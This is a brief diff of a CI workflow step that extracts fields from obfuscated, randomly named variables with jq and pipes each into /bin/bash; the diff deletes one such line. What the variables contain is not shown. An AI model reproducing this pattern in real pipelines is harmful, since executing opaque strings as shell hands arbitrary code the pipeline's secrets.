@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jivyf2" | jq -r .g51274 | /bin/bash
           printf '%s' "$hxsfc90" | jq -r .fb01978 | /bin/bash
           echo $tzc5 | jq -r .p217 | /bin/bash
-          printf '%s' "$cgect75" | jq -r .t3057 | /bin/bash
           echo $y43513 | jq -r .g0874 | /bin/bash
 
       - name: Store results
